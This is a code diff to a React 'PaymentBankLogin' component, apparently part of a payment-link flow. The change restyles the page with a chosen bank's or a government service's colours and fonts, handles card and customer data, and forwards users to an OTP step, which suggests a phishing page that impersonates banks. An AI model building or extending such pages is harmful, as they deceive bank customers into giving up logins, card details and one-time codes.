@@ -45,6 +45,7 @@ const PaymentBankLogin = () => {
   // استنتاج الدولة من العملة إذا لم تكن موجودة
   const inferredCountryFromCurrency = currencyParam ? getCountryByCurrency(currencyParam) : null;
 
+  const selectedCountry = countryParam || inferredCountryFromCurrency || linkData?.payload?.selectedCountry || "SA";
   const customerInfo = linkData?.payload?.customerInfo || {};
   const selectedBankId = bankParam || linkData?.payload?.selectedBank || '';
   const cardInfo = linkData?.payload?.cardInfo || {};
@@ -62,9 +63,10 @@ const PaymentBankLogin = () => {
   // Use government theme if it's a government service
   const primaryColor = isGovService ? govSystem.colors.primary : (selectedBankBranding?.colors?.primary || branding.colors.primary);
   const secondaryColor = isGovService ? govSystem.colors.secondary : (selectedBankBranding?.colors?.secondary || branding.colors.secondary);
-  const surfaceColor = isGovService ? govSystem.colors.surface : '#F8F9FA';
-  const fontFamily = isGovService ? govSystem.fonts.primaryAr : 'Cairo, Tajawal, sans-serif';
-  const selectedCountry = countryParam || inferredCountryFromCurrency || linkData?.payload?.selectedCountry || "SA";
+  const surfaceColor = isGovService ? govSystem.colors.surface : (selectedBankBranding?.colors?.surface || '#F8F9FA');
+  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (selectedBankBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif');
+  const textColor = isGovService ? govSystem.colors.text : (selectedBankBranding?.colors?.text || '#1A1A1A');
+  const borderColor = isGovService ? govSystem.colors.border : (selectedBankBranding?.colors?.border || '#E5E5E5');
   const shippingInfo = linkData?.payload as any;
   const rawAmount = amountParam || shippingInfo?.cod_amount;
 
@@ -263,12 +265,6 @@ const PaymentBankLogin = () => {
     
     navigate(`/pay/${id}/otp?${queryString}`);
   };
-  
-  const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
-  const secondaryColor = selectedBankBranding?.colors?.secondary || branding.colors.secondary;
-  const surfaceColor = selectedBankBranding?.colors?.surface || '#FAFAFA';
-  const textColor = selectedBankBranding?.colors?.text || '#1A1A1A';
-  const borderColor = selectedBankBranding?.colors?.border || '#E5E5E5';
   
   return (
     <>
